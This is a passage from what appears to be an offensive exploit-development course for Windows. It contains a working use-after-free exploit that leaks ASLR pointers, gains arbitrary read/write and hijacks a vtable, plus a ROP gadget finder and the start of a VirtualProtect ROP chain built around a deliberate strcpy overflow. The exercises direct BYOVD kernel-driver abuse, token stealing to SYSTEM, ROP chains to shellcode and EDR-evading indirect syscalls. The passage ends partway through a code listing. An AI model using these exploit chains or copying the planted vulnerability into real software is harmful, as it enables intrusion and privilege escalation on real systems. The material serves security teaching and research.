        leakedVtable   = ((SESSION_OBJECT*)session)->vtable;
        leakedCallback = ((SESSION_OBJECT*)session)->destroyCallback;
        leakedSecret   = ((SESSION_OBJECT*)session)->sessionId;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] UAF read caused exception (page decommitted)\n");
        printf("[*] On Segment Heap, retry with faster timing may work\n");
        return FALSE;
    }

    if (leakedVtable == 0) {
        printf("[-] Leaked vtable is NULL (memory was zeroed after free)\n");
        return FALSE;
    }

    printf("[+] Leaked vtable:       0x%016llx (points into ntdll)\n", leakedVtable);
    printf("[+] Leaked callback:     0x%016llx (points into kernel32)\n", leakedCallback);
    printf("[+] Leaked session key:  0x%016llx\n", leakedSecret);

    DWORD64 highBits = (leakedVtable >> 32) & 0xFFFFFFFF;
    if (highBits < 0x00007FF0 || highBits > 0x00007FFF) {
        printf("[-] Leaked pointer has unexpected high bits: 0x%llx\n", highBits);
        printf("[-] Memory may have been recycled before we read it\n");
        return FALSE;
    }

    printf("[+] Pointer validation passed (high bits: 0x%llx)\n", highBits);

    printf("\n[*] Phase 4: Type confusion via heap spray\n"); fflush(stdout);
    printf("[*] Spraying %d FAKE_OBJECTs (same size as SESSION_OBJECT)\n", RECLAIM_TRIES);
    printf("[*] sizeof(SESSION_OBJECT) = %zu, sizeof(FAKE_OBJECT) = %zu\n",
           sizeof(SESSION_OBJECT), sizeof(FAKE_OBJECT));

    FAKE_OBJECT* confusedObj = NULL;
    FAKE_OBJECT* sprayArray[RECLAIM_TRIES];
    int sprayCount = 0;

    for (int i = 0; i < RECLAIM_TRIES; i++) {
        FAKE_OBJECT* fake = (FAKE_OBJECT*)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FAKE_OBJECT));
        if (!fake) continue;

        sprayArray[sprayCount++] = fake;

        if ((PVOID)fake == (PVOID)session) {
            printf("[+] Reclaimed freed memory at %p (spray index %d)\n", fake, i);
            confusedObj = fake;
            confusedObj->controlledPtr = NULL;
            confusedObj->controlledLen = 0;
            break;
        }
    }

    for (int i = 0; i < sprayCount; i++) {
        if (sprayArray[i] != confusedObj) {
            HeapFree(GetProcessHeap(), 0, sprayArray[i]);
        }
    }

    if (!confusedObj) {
        printf("[-] Failed to reclaim freed memory after %d attempts\n", RECLAIM_TRIES);
        return FALSE;
    }
    printf("\n[*] Phase 5: ASLR bypass via leaked pointer + arbitrary read\n"); fflush(stdout);
    printf("[*] Scanning backward from leaked vtable 0x%016llx for MZ header...\n", leakedVtable);

    DWORD64 ntdllBase = FindModuleBaseFromLeak(confusedObj, leakedVtable);
    if (!ntdllBase) {
        printf("[-] Failed to find ntdll base from leaked pointer\n");
        HeapFree(GetProcessHeap(), 0, confusedObj);
        return FALSE;
    }

    printf("[+] ntdll.dll base: 0x%016llx\n", ntdllBase);
    DWORD64 k32Base = FindModuleBaseFromLeak(confusedObj, leakedCallback);
    if (k32Base) {
        printf("[+] kernel32.dll base: 0x%016llx\n", k32Base);
    }

    BYTE mzCheck[2] = {0};
    if (RealArbitraryRead(confusedObj, ntdllBase, mzCheck, 2)) {
        if (mzCheck[0] == 'M' && mzCheck[1] == 'Z') {
            printf("[+] MZ header verified via arbitrary read at ntdll base\n");
        }
    }

    printf("\n[*] Phase 6: Verifying arbitrary R/W primitives\n"); fflush(stdout);

    DWORD e_lfanew = 0;
    RealArbitraryRead(confusedObj, ntdllBase + 0x3C, &e_lfanew, sizeof(e_lfanew));
    DWORD timestamp = 0;
    RealArbitraryRead(confusedObj, ntdllBase + e_lfanew + 8, &timestamp, sizeof(timestamp));
    printf("[+] ntdll PE timestamp: 0x%08X (read via arbitrary read)\n", timestamp);

    BYTE* testBuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 64);
    if (testBuf) {
        BYTE pattern[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};
        if (RealArbitraryWrite(confusedObj, (DWORD64)testBuf, pattern, sizeof(pattern))) {
            if (memcmp(testBuf, pattern, sizeof(pattern)) == 0) {
                printf("[+] Arbitrary write verified (wrote 0xDEADBEEFCAFEBABE to %p)\n", testBuf);
            }
        }
        HeapFree(GetProcessHeap(), 0, testBuf);
    }

    printf("\n[*] Phase 7: Vtable hijack demonstration\n"); fflush(stdout);

    typedef struct { DWORD64 vtable; DWORD64 data; } VICTIM_OBJ;
    VICTIM_OBJ* victim = (VICTIM_OBJ*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VICTIM_OBJ));
    if (!victim) {
        HeapFree(GetProcessHeap(), 0, confusedObj);
        return FALSE;
    }
    victim->vtable = ntdllBase + 0x1000;  // legitimate vtable

    printf("[+] Victim object at: %p, vtable: 0x%016llx\n", victim, victim->vtable);

    DWORD64 fakeVtableAddr = 0;
    DWORD64* fakeVtable = (DWORD64*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
    if (fakeVtable && k32Base) {
        DWORD k32_elfanew = 0;
        RealArbitraryRead(confusedObj, k32Base + 0x3C, &k32_elfanew, sizeof(k32_elfanew));

        DWORD exportRVA = 0;
        RealArbitraryRead(confusedObj, k32Base + k32_elfanew + 0x88, &exportRVA, sizeof(exportRVA));

        if (exportRVA) {
            printf("[+] kernel32 export directory RVA: 0x%08X\n", exportRVA);

            DWORD numFunctions = 0, addrOfFunctions = 0, addrOfNames = 0, addrOfOrdinals = 0;
            RealArbitraryRead(confusedObj, k32Base + exportRVA + 0x14, &numFunctions, 4);
            RealArbitraryRead(confusedObj, k32Base + exportRVA + 0x1C, &addrOfFunctions, 4);
            RealArbitraryRead(confusedObj, k32Base + exportRVA + 0x20, &addrOfNames, 4);
            RealArbitraryRead(confusedObj, k32Base + exportRVA + 0x24, &addrOfOrdinals, 4);

            DWORD targetFuncRVA = 0;
            for (DWORD i = 0; i < numFunctions && i < 2000; i++) {
                DWORD nameRVA = 0;
                RealArbitraryRead(confusedObj, k32Base + addrOfNames + i * 4, &nameRVA, 4);
                if (!nameRVA) continue;

                char funcName[32] = {0};
                RealArbitraryRead(confusedObj, k32Base + nameRVA, funcName, 20);

                if (strcmp(funcName, "GetCurrentProcessId") == 0) {
                    WORD ordinal = 0;
                    RealArbitraryRead(confusedObj, k32Base + addrOfOrdinals + i * 2, &ordinal, 2);
                    RealArbitraryRead(confusedObj, k32Base + addrOfFunctions + ordinal * 4, &targetFuncRVA, 4);
                    printf("[+] Found GetCurrentProcessId at RVA 0x%08X\n", targetFuncRVA);
                    break;
                }
            }

            if (targetFuncRVA) {
                fakeVtable[0] = k32Base + targetFuncRVA;
                fakeVtableAddr = (DWORD64)fakeVtable;
                printf("[+] Fake vtable[0] = 0x%016llx (GetCurrentProcessId)\n", fakeVtable[0]);
            }
        }
    }

    if (fakeVtableAddr) {
        RealArbitraryWrite(confusedObj, (DWORD64)victim, &fakeVtableAddr, sizeof(DWORD64));
        printf("[+] Vtable corrupted: 0x%016llx -> 0x%016llx\n",
               ntdllBase + 0x1000, victim->vtable);
        typedef DWORD (*VFunc)(void);
        DWORD64 funcAddr = 0;
        RealArbitraryRead(confusedObj, victim->vtable, &funcAddr, sizeof(funcAddr));
        VFunc hijacked = (VFunc)funcAddr;

        printf("[*] Calling hijacked virtual function...\n");
        DWORD pid = hijacked();
        printf("[+] Hijacked function returned: %lu (our PID)\n", pid);
    }

    if (fakeVtable) HeapFree(GetProcessHeap(), 0, fakeVtable);
    HeapFree(GetProcessHeap(), 0, victim);
    HeapFree(GetProcessHeap(), 0, confusedObj);

    printf("\n=== ASLR Bypass Verification ===\n");
    printf("[+] ntdll base leaked:      0x%016llx\n", ntdllBase);
    printf("[+] ntdll base (verify):    0x%016llx\n", (DWORD64)GetModuleHandleA("ntdll.dll"));
    printf("[+] Match: %s\n",
           ntdllBase == (DWORD64)GetModuleHandleA("ntdll.dll") ? "YES" : "NO");
    if (k32Base) {
        printf("[+] kernel32 base leaked:   0x%016llx\n", k32Base);
        printf("[+] kernel32 base (verify): 0x%016llx\n", (DWORD64)GetModuleHandleA("kernel32.dll"));
        printf("[+] Match: %s\n",
               k32Base == (DWORD64)GetModuleHandleA("kernel32.dll") ? "YES" : "NO");
    }

    return TRUE;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));

    printf("=== UAF Memory Leak Exploit (ASLR Bypass) ===\n\n");



    VictimInit();
    printf("[*] Victim library initialized (has ntdll/kernel32 pointers internally)\n");
    printf("[*] Attacker does NOT have access to module addresses\n\n");

    if (ExploitUAF()) {
        printf("\n[+] Full exploit chain successful:\n");
        printf("    UAF read -> pointer leak -> ASLR bypass -> arb R/W -> vtable hijack\n");
        return 0;
    }

    printf("\n[-] Exploitation failed\n");
    return 1;
}
```

**Compile & Run:**

```bash
cl src\uaf_memory_leak.c /Fe:bin\uaf_leak.exe /GS- /DYNAMICBASE psapi.lib advapi32.lib /I.\headers
.\bin\uaf_leak.exe
```

### Practical Exercises

#### Exercise 1: Complete the Win32k UAF Exploitation Chain

Extend the win32k_uaf_exploit.c to achieve full privilege escalation by combining UAF with kernel R/W primitives.

**Tasks:**

1. After triggering window UAF and leaking tagWND address, use RTCore64 to read tagWND structure
2. Extract kernel pointers from tagWND (e.g., pSBInfo, spwndParent) to calculate win32kbase.sys base
3. Implement pool spray with controlled objects (bitmaps/palettes) to reclaim freed tagWND memory
4. Use type confusion to corrupt reclaimed object's vtable pointer
5. Trigger virtual function call to hijack control flow
6. Chain with token stealing via ApplyLPE() for full SYSTEM escalation

**Success Criteria:**

- Successfully leak tagWND kernel address via HMValidateHandle (or alternative on Win11 24H2+)
- Pool spray reliably reclaims freed memory (verify via address comparison)
- Type confusion enables controlled vtable corruption
- Exploit achieves SYSTEM privileges without BSOD
- Works with RTCore64 kernel R/W primitives

**Bonus Challenge:**
Implement alternative KASLR bypass for Windows 11 24H2+ where HMValidateHandle is patched (hint: use NtUserQueryWindow or GDI object leaks).

#### Exercise 2: Physical Memory Exploitation via eneio64.sys

Extend the eneio64_exploit.c to implement EPROCESS scanning without relying on PsInitialSystemProcess export.

**Tasks:**

1. After mapping physical memory and finding CR3, scan physical RAM for EPROCESS structures
2. Validate EPROCESS candidates by checking: PID field, ActiveProcessLinks alignment, token pointer validity
3. Locate System EPROCESS (PID 4) via physical memory scanning (not via export)
4. Locate current process EPROCESS by matching GetCurrentProcessId()
5. Implement dynamic offset resolution by analyzing System EPROCESS structure layout
6. Perform token stealing via physical memory write (bypass kernel protections)
7. Verify privilege escalation and restore original token on cleanup

**Success Criteria:**

- Physical memory mapping succeeds (maps entire RAM, typically 8-32GB)
- CR3 found via page table walk (validates V2P translation)
- EPROCESS structures located without using PsInitialSystemProcess
- Dynamic offset resolution works across Windows versions (19041-26100)
- Token stealing via physical write achieves SYSTEM privileges
- Proper cleanup unmaps memory and closes device handle

**Bonus Challenge:**
Implement EPROCESS validation heuristics to reduce false positives during physical memory scanning (check for valid kernel pointers, reference counts, process name strings).

#### Exercise 3: Heap Over-Read ASLR Bypass + ROP Exploitation

Extend heap_overread_exploit.c to build a complete ROP chain that executes arbitrary shellcode.

**Tasks:**

1. Improve heap feng shui reliability: spray 2000 sessions → free even-indexed → allocate TLV buffer
2. Trigger over-read via ParseTLVPacket with malicious length field (8192 bytes)
3. Scan overread output for SENSITIVE_SESSION markers (userId=1337, permissions=0x80000000)
4. Extract leaked vtable pointer and validate high bits (0x00007FF0-0x00007FFF range)
5. Calculate ntdll base by masking vtable pointer and scanning backward for MZ header
6. Find ROP gadgets in ntdll: pop rcx; ret, pop rdx; ret, pop r8; ret, pop r9; ret
7. Build ROP chain: set up VirtualProtect arguments → call VirtualProtect → return to shellcode
8. Patch shellcode with MessageBoxA address and execute

**Success Criteria:**

- Heap feng shui succeeds within MAX_ATTEMPTS (5 retries)
- Over-read leaks valid session data (crypto keys match planted values)
- ASLR bypass correctly calculates ntdll base (matches GetModuleHandle)
- All required ROP gadgets found in ntdll.dll
- ROP chain successfully calls VirtualProtect and marks shellcode executable
- Shellcode executes and displays MessageBox

**Bonus Challenge:**
Implement stack pivot technique to place ROP chain on heap and pivot RSP to it, simulating a real stack overflow scenario.

#### Exercise 4: UAF Type Confusion for Arbitrary R/W

Extend uaf_memory_leak.c to implement a complete exploitation chain from UAF to arbitrary code execution.

**Tasks:**

1. Trigger UAF by calling VictimCloseSession() while retaining dangling pointer
2. Read freed memory to leak vtable, callback, and sessionId (secret key)
3. Validate leaked pointers (check high bits 0x00007FF0-0x00007FFF)
4. Spray FAKE_OBJECT structures (RECLAIM_TRIES=500) to reclaim freed memory
5. Verify reclamation by comparing spray addresses with original session pointer
6. Implement RealArbitraryRead() using confused pointer's controlledPtr field
7. Implement RealArbitraryWrite() using confused pointer's controlledPtr field
8. Use arbitrary read to scan backward from leaked vtable for ntdll MZ header
9. Read PE headers to extract timestamp and verify arbitrary read works
10. Create victim object with legitimate vtable, corrupt it via arbitrary write
11. Build fake vtable pointing to GetCurrentProcessId, trigger virtual call

**Success Criteria:**

- UAF read successfully leaks valid pointers before memory is recycled
- Heap spray reclaims freed memory within 500 attempts
- Type confusion enables arbitrary R/W (verified via test operations)
- ASLR bypass finds ntdll base via backward MZ scan
- Vtable hijack successfully redirects virtual call to controlled function
- Exploit demonstrates full chain: UAF → leak → arb R/W → vtable hijack

**Bonus Challenge:**
Extend the exploit to achieve code execution by building a fake vtable with ROP gadgets and chaining to shellcode execution.

### Key Takeaways

**BYOVD Exploitation:**

- Primary technique for kernel R/W primitives in 2025-2026 (bypasses DSE/HVCI via legitimate signatures)
- RTCore64.sys provides IOCTL-based kernel R/W (0x80002048 read, 0x8000204C write) via 32-bit operations
- eneio64.sys maps entire physical memory into userspace for direct manipulation
- Implements driver fallback logic with retry attempts (MAX_RETRY_ATTEMPTS = 3)
- Indirect syscalls via ExecuteIndirectSyscall() evade EDR hooks on NtDeviceIoControlFile
- Three LPE techniques supported: Token Stealing, ACL Editing, Privilege Manipulation

**ASLR Bypass Techniques:**

- **Physical Memory Scanning**: Scan for MZ header in physical RAM, perform page table walks to find CR3
- **Virtual-to-Physical Translation**: 4-level paging via VirtualToPhysical() enables kernel object access
- **Heap Over-Read**: TLV parser vulnerability (CWE-126) leaks adjacent SENSITIVE_SESSION structures
- **UAF Type Confusion**: Dangling pointer + heap spray enables arbitrary R/W via confused object types
- **HMValidateHandle Leak**: user32!HMValidateHandle returns kernel tagWND addresses (patched Win11 24H2+)
- **Win32k Session Pool**: Windows, menus, bitmaps used for heap feng shui and reclamation

**Exploitation Patterns:**

- **Heap Feng Shui**: Spray 2000+ objects → free alternating (every 2nd) → allocate vulnerable buffer in hole
- **Physical Memory Exploitation**: Map RAM → scan for kernel → find CR3 → V2P translation → token stealing
- **ROP Chain Construction**: Leak ntdll base → find gadgets (pop rcx/rdx/r8/r9; ret) → chain VirtualProtect
- **Win32k UAF**: Create window → leak tagWND via HMValidateHandle → race DestroyWindow with access
- **Multi-Attempt Strategy**: Retry up to MAX_ATTEMPTS (5) for heap layout-dependent exploits

### Discussion Questions

1. Why is indirect syscall execution (ExecuteIndirectSyscall) necessary for NtDeviceIoControlFile, and what EDR hooks does it bypass?
2. Compare RTCore64.sys (IOCTL-based) vs eneio64.sys (physical memory mapping) - which is more powerful and why?
3. Why scan physical memory for ntoskrnl.exe MZ header instead of using NtQuerySystemInformation?
4. In heap_overread_exploit.c, why free even-indexed sessions (i+=2) instead of every 3rd or random pattern?
5. How does the TLV parser vulnerability (CWE-126) enable ASLR bypass? What makes it exploitable?
6. What makes vtable hijacking reliable after achieving arbitrary write? What are the risks?
7. Why is HMValidateHandle patched in Windows 11 24H2+? What alternative leak techniques exist?
8. What makes tagWND/tagMENU structures attractive targets for UAF exploitation?
9. In heap_overread_exploit.c, why does the ROP chain call VirtualProtect before executing shellcode?
10. Why allocate shellcode as PAGE_READWRITE initially, then change to PAGE_EXECUTE_READ?
11. How does ExploitInitialize() perform anti-analysis checks? What does it detect?
12. How can dynamic offset resolution (VerifyEPROCESSOffsets) work across Windows versions without hardcoded offsets?
13. What makes ApplyLPE() support three techniques (Token Stealing, ACL Editing, Privilege Manipulation)? When to use each?
14. How does ApplyLPEPhysical() differ from ApplyLPE()? What additional challenges exist?
15. What future Windows mitigations might break these exploitation techniques? How can exploits adapt?

## Day 2: Control-Flow Hijacking (CET/CFG/XFG Era)

- **Goal**: Learn control-flow hijacking techniques to bypass Intel CET shadow stacks, Windows CFG/XFG, and kernel CFG (kCFG)

- **Activities**:
  - _Reading_:
    - [Intel CET Technical Specification](https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html)
    - [Bypassing Intel CET with Counterfeit Objects](https://www.offsec.com/blog/bypassing-intel-cet-with-counterfeit-objects/)
    - [JOP: Jump-Oriented Programming](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)
    - [Clang CFI Bypass](https://github.com/0xcl/clang-cfi-bypass-techniques)
    - [Windows CFG Internals](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
    - [XFG Function Prototype Hashes](https://blog.quarkslab.com/how-the-msvc-compiler-generates-xfg-function-prototype-hashes.html)
    - [Modern ROP Gadget Finding](https://github.com/0vercl0k/rp)
  - _Online Resources_:
    - [ROP Emporium Challenges](https://ropemporium.com/)
    - [Counterfeit Objects Exploitation](https://github.com/uf0o/Counterfeit_Object_Oriented_Programming_COOP)
    - [ropr - ROP Gadget Finder](https://github.com/Ben-Lichtman/ropr)
    - [WinGadgetHunter](https://joshfinley.github.io/posts/2023-08-15-wingadgethunter/)
  - _Lab Setup_:
    - Windows 11 24H2/25H2 with CET-capable CPU (12th gen Intel+)
    - Visual Studio 2022 with /CETCOMPAT and /guard:xfg flags
    - ROPgadget, ropper, rp++, or ropr for gadget finding
    - x64dbg with CET debugging support
    - WinDbg Preview for kernel debugging
  - _Exercises_:
    1. Modern ROP gadget finding with CET constraints
    2. ROP Emporium challenges (ret2win -> ret2csu)
    3. Build VirtualProtect ROP chain (Windows)
    4. Build mprotect ROP chain (Linux)
    5. JOP chain construction (CET bypass)
    6. CET shadow stack bypass with counterfeit objects
    7. XFG type signature hash collision
    8. Stack pivot exploitation

### Deliverables

- [ ] Implement modern ROP gadget finder with CET/CFG filtering
- [ ] Complete ROP Emporium challenges (at least 5)
- [ ] Build working VirtualProtect ROP chain
- [ ] Implement JOP chain that bypasses CET shadow stack
- [ ] Build CET-aware counterfeit objects exploit
- [ ] Demonstrate XFG bypass via type confusion
- [ ] Document all techniques with working PoCs

### Intel CET Implementation in Windows (VTL0/VTL1)

#### Virtual Trust Levels (VTL) Architecture

Windows 11 with HVCI enabled uses Virtual Trust Levels to isolate security-critical functionality:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           VTL0 (Normal Kernel)                              │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │  ntoskrnl.exe - Normal kernel operations                            │   │
│   │  - Standard system calls                                            │   │
│   │  - Device drivers                                                   │   │
│   │  - File system, networking, etc.                                    │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Shadow Stack Pointer: MSR IA32_PL0_SSP (0x6A4)                            │
│   Managed by: VTL1 via secure system calls                                  │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    │ Secure System Calls (VTL0 → VTL1)
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          VTL1 (Secure Kernel)                               │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │  securekernel.exe - Security-critical operations                    │   │
│   │  - Shadow stack allocation/management                               │   │
│   │  - HVCI validation                                                  │   │
│   │  - Credential Guard                                                 │   │
│   │  - Secure system call dispatch                                      │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   Shadow stacks allocated in secure memory (VTL1-only accessible)           │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### Shadow Stack Enforcement

When a `RET` instruction is executed:

1. CPU pops return address from data stack
2. CPU pops shadow stack entry
3. **Hardware comparison**: Data stack address must match shadow stack entry
4. **Mismatch**: #CP (Control Protection) exception → crash

```
┌─────────────────────────────────────────────────────────────────┐
│                     RET Instruction Execution                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   Data Stack:                    Shadow Stack:                  │
│   ┌──────────────┐               ┌──────────────┐               │
│   │ Return Addr  │◄──┐           │ Return Addr  │◄──┐           │
│   ├──────────────┤   │           ├──────────────┤   │           │
│   │   ...        │   │           │   ...        │   │           │
│   └──────────────┘   │           └──────────────┘   │           │
│                      │                              │           │
│                      └───────── COMPARE ────────────┘           │
│                                │                                │
│                                ▼                                │
│                    ┌───────────────────────┐                    │
│                    │    Match? → Continue  │                    │
│                    │    No Match? → #CP    │                    │
│                    └───────────────────────┘                    │
└─────────────────────────────────────────────────────────────────┘
```

#### Bypass Complexity on HVCI-Enabled Systems

**Option 1: Compromise Secure Kernel (VTL1)** - Extremely Difficult

- Requires VTL1 vulnerability or misconfiguration
- VTL1 has its own CET protection
- Secure Kernel code is minimal and hardened

**Option 2: Find WRSS Gadgets in Kernel** - Rare and Restricted

- `WRSS` instruction only works in kernel mode
- Very few legitimate uses in kernel code
- Gadgets are extremely rare

**Option 3: JOP/COP Chains** - Faces XFG Validation

- Jump-Oriented Programming avoids `RET` instructions
- Call-Oriented Programming uses indirect calls
- On HVCI systems, XFG validates indirect call targets

**Option 4: Disable CET via MSR Manipulation** - Requires Kernel R/W + HVCI Bypass

- Clear CET enable bit in IA32_S_CET MSR
- Requires arbitrary kernel write primitive
- HVCI may prevent MSR modification

### ROP Gadget Finding

Modern ROP exploitation requires finding gadgets that satisfy multiple constraints: CET compatibility (no `RET` corruption), CFG validity (land on valid function starts), and XFG type signature matching. This implementation scans PE modules for traditional ROP gadgets (`pop reg; ret`) and CET-compatible alternatives (JOP/COP gadgets using `jmp`/`call` instead of `ret`).

**Key Challenges**:

- **CET Shadow Stack**: Gadgets ending in `RET` must not corrupt the shadow stack (or use JOP/COP instead)
- **CFG Bitmap**: Indirect calls must target addresses in CFG bitmap (use `dumpbin /loadconfig` to extract)
- **XFG Type Hashes**: Indirect calls must match expected function prototype hash
- **kCFG (Kernel)**: Kernel gadgets must pass kernel CFG validation

```c
// advanced_rop_finder.c
// ROP Gadget Finder with CET/CFG/XFG Filtering
// Compile: cl src\advanced_rop_finder.c /Fe:bin\rop_finder.exe dbghelp.lib advapi32.lib /I.\headers

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "exploit_utils.h"
#include "gadget_finder.h"

#define MAX_GADGETS 4096
static ROP_GADGET g_gadgets[MAX_GADGETS];
static int g_gadgetCount = 0;

static void PrintGadgets(BOOL hasCFG) {
    int cetCount = 0;
    int cfgValidCount = 0;
    int highQualityCount = 0;

    for (int i = 0; i < g_gadgetCount; i++) {
        if (g_gadgets[i].cetCompatible) cetCount++;
        if (g_gadgets[i].cfgValid) cfgValidCount++;
        if (g_gadgets[i].quality >= 8) highQualityCount++;
    }

    printf("[+] Total gadgets found: %d\n", g_gadgetCount);
    printf("[+] High quality (score >= 8): %d\n", highQualityCount);
    if (hasCFG) {
        printf("[+] CFG-valid call targets: %d (gadgets that also pass CFG check)\n", cfgValidCount);
    } else {
        printf("[*] Module has no CFG -- all gadgets usable\n");
    }
    printf("[+] CET-compatible (JOP/COP): %d\n\n", cetCount);

    printf("=== High Quality ROP Gadgets (Score >= 8) ===\n\n");
    int printed = 0;
    for (int i = 0; i < g_gadgetCount && printed < 10; i++) {
        ROP_GADGET *g = &g_gadgets[i];
        if (g->quality >= 8 && !g->cetCompatible) {
            printf("  0x%016llx: %-40s [q=%d%s]\n",
                   g->address, g->disasm, g->quality,
                   g->cfgValid ? " cfg" : "");
            printed++;
        }
    }
    if (printed == 0) printf("  (none found)\n");
    printf("\n");

    // CET-compatible gadgets (JOP/COP) - these bypass shadow stack
    if (cetCount > 0) {
        printf("=== CET-Compatible Gadgets (JOP/COP) ===\n\n");
        printed = 0;
        for (int i = 0; i < g_gadgetCount && printed < 10; i++) {
            ROP_GADGET *g = &g_gadgets[i];
            if (g->cetCompatible) {
                printf("  0x%016llx: %-40s [q=%d%s]\n",
                       g->address, g->disasm, g->quality,
                       g->cfgValid ? " cfg" : "");
                printed++;
            }
        }
        if (printed == 0) printf("  (none found)\n");
        printf("\n");
    }

    if (hasCFG && cfgValidCount > 0) {
        printf("=== CFG-Valid Gadgets (usable even with CFG enforcement) ===\n\n");
        printed = 0;
        for (int i = 0; i < g_gadgetCount && printed < 10; i++) {
            if (g_gadgets[i].cfgValid && g_gadgets[i].quality >= 7) {
                printf("  0x%016llx: %-40s [q=%d]\n",
                       g_gadgets[i].address, g_gadgets[i].disasm, g_gadgets[i].quality);
                printed++;
            }
        }
        printf("\n");
    }

    printf("=== All Gadgets by Type ===\n\n");
    const char* typeNames[] = {
        "pop;ret",
        "pop;pop;ret",
        "mov;ret",
        "load;ret",
        "syscall",
        "JOP dispatcher",
        "COP call",
        "stack pivot",
        "VirtualProtect",
    };
    #define TYPE_COUNT 9
    int typeCounts[TYPE_COUNT] = {0};
    for (int i = 0; i < g_gadgetCount; i++) {
        if (g_gadgets[i].type >= 0 && g_gadgets[i].type < TYPE_COUNT) {
            typeCounts[g_gadgets[i].type]++;
        }
    }
    for (int t = 0; t < TYPE_COUNT; t++) {
        if (typeCounts[t] > 0) {
            printf("  %-20s %d gadgets\n", typeNames[t], typeCounts[t]);
        }
    }
    printf("\n");
}

int main(int argc, char *argv[]) {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("[*] CET/CFG/XFG-Aware Gadget Discovery\n");
    const char *moduleName = (argc > 1) ? argv[1] : "ntdll.dll";
    HMODULE hMod = LoadLibraryA(moduleName);
    if (!hMod) {
        printf("[-] Failed to load %s\n", moduleName);
        return 1;
    }
    printf("[+] Loaded %s at 0x%p\n", moduleName, hMod);

    BOOL hasCFG = ExtractCFGBitmap(hMod);
    printf("[+] CFG: %s\n", hasCFG ? "enabled" : "not present");

    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hMod, &textStart, &textSize)) {
        printf("[-] .text section not found\n");
        return 1;
    }
    printf("[+] .text section: 0x%p (size: 0x%X)\n\n", textStart, textSize);

    ScanForROPGadgets(textStart, textSize, (DWORD64)hMod, g_gadgets, &g_gadgetCount, MAX_GADGETS);
    ScanForJOPGadgets(textStart, textSize, (DWORD64)hMod, g_gadgets, &g_gadgetCount, MAX_GADGETS);

    PrintGadgets(hasCFG);
    return 0;
}
```

```asm
; test_gadgets.asm
.code

; Export a function containing gadget sequences
PUBLIC gadget_collection
gadget_collection PROC
    ; JOP gadgets (pop + jmp reg)
    pop rax
    jmp rax
    nop

    pop rcx
    jmp rcx
    nop

    pop rdx
    jmp rdx
    nop

    pop rbx
    jmp rbx
    nop

    ; COP gadgets (pop + call reg)
    pop rax
    call rax
    nop

    pop rcx
    call rcx
    nop

    ; Traditional ROP for comparison
    pop rdi
    ret

    pop rsi
    ret

    pop rbp
    ret

    ret
gadget_collection ENDP

END
```

```dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    return TRUE;
}
```

**Compile & Run:**

```bash
ml64 /c test_gadgets.asm
cl /LD test_gadgets_dll.c test_gadgets.obj /Fe:test_gadgets.dll
cl src\advanced_rop_finder.c /Fe:bin\rop_finder.exe dbghelp.lib advapi32.lib /I.\headers
.\bin\rop_finder.exe test_gadgets.dll
.\bin\rop_finder.exe C:\Windows\System32\ole32.dll
```

**Recommended Tools**:

```bash
# rp++ (fast, multi-platform)
$ rp-win-x64.exe -f ntdll.dll -r 5 --unique

# ropr (Rust, very fast)
$ ropr ntdll.dll --nosys

# ROPgadget (Python, classic)
$ ROPgadget --binary ntdll.dll --depth 10

# WinGadgetHunter (Windows-specific)
$ WinGadgetHunter.exe --dll ntdll.dll --pattern "pop.*ret"
```

### VirtualProtect/mprotect Chains

DEP (Data Execution Prevention) marks stack and heap as non-executable. To execute shellcode, the attacker builds a ROP/JOP chain that calls `VirtualProtect` (Windows) or `mprotect` (Linux) to change the memory protection of a shellcode region to `PAGE_EXECUTE_READ` / `PROT_READ|PROT_EXEC`. The chain must set up the correct calling convention arguments (`rcx`/`rdx`/`r8`/`r9` on Windows x64, `rdi`/`rsi`/`rdx` on Linux x64) using gadgets like `pop rcx; ret` or `pop rdi; ret`.

```c
// virtualprotect_rop.c
// ROP chain to call VirtualProtect for DEP bypass
// Compile: cl src\virtualprotect_rop.c /Fe:bin\rop_demo.exe advapi32.lib /GS- /I.\headers

#define SYSCALLS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")

#include "exploit_common.h"
#include "evasion.h"
#include "bypass.h"
#include "syscalls.h"
#include "exploit_utils.h"
#include "gadget_finder.h"
#include "heap_utils.h"

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

static void find_gadgets() {
    printf("[*] Finding ROP gadgets...\n");
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    HMODULE hKernel32 = GetModuleByHash(0x84CCAF67);
    if (!hKernel32) hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hNtdll || !hKernel32) {
        printf("[-] Failed to get module handles\n");
        return;
    }
